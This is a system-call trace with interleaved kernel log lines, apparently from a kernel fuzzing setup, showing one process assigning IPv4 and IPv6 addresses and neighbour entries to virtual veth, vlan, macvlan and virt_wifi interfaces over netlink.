[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2b\x00\x00&quot;]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_virt_wifi&quot;, ifr_ifindex=51}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x33\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2c\x08\x00\x01\x00\xac\x14\x14\x2c&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_virt_wifi&quot;, ifr_ifindex=51}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x33\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2c&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_virt_wifi&quot;, ifr_ifindex=51}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x33\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2c\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_virt_wifi&quot;, ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[   77.403262][ T5086] 8021q: adding VLAN 0 to HW filter on device batadv0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x32\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2d\x08\x00\x01\x00\xac\x14\x14\x2d&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_virt_wifi&quot;, ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x32\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_virt_wifi&quot;, ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x32\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2d\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;virt_wifi0&quot;, ifr_ifindex=52}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x34\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2e\x08\x00\x01\x00\xac\x14\x14\x2e&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;virt_wifi0&quot;, ifr_ifindex=52}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x34\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;virt_wifi0&quot;, ifr_ifindex=52}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x34\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2e\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x34\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2e\x00\x00&quot;]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x36\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2f\x08\x00\x01\x00\xac\x14\x14\x2f&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x36\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x36\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2f\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_vlan&quot;, ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x35\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x30\x08\x00\x01\x00\xac\x14\x14\x30&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[   77.475527][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_virt_wifi: link becomes ready
[   77.485056][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_virt_wifi: link becomes ready
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_vlan&quot;, ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x35\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_vlan&quot;, ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x35\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x30\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vlan0&quot;, ifr_ifindex=55}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x37\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x31\x08\x00\x01\x00\xac\x14\x14\x31&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vlan0&quot;, ifr_ifindex=55}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x37\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vlan0&quot;, ifr_ifindex=55}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x37\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x31\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vlan1&quot;, ifr_ifindex=56}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x38\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x32\x08\x00\x01\x00\xac\x14\x14\x32&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vlan1&quot;, ifr_ifindex=56}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x38\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x32\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x32&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vlan1&quot;, ifr_ifindex=56}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x38\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x32\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvlan0&quot;, ifr_ifindex=57}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x39\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x33\x08\x00\x01\x00\xac\x14\x14\x33&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvlan0&quot;, ifr_ifindex=57}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x39\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;macvlan0&quot;, ifr_ifindex=57}) = 0
[   77.545858][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_vlan: link becomes ready
[   77.554932][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_vlan: link becomes ready
[   77.565132][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vlan0: link becomes ready
[   77.573585][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vlan1: link becomes ready
[   77.589882][ T5086] veth0_vlan: entered promiscuous mode
[pid  5086] close(4)                    = 0
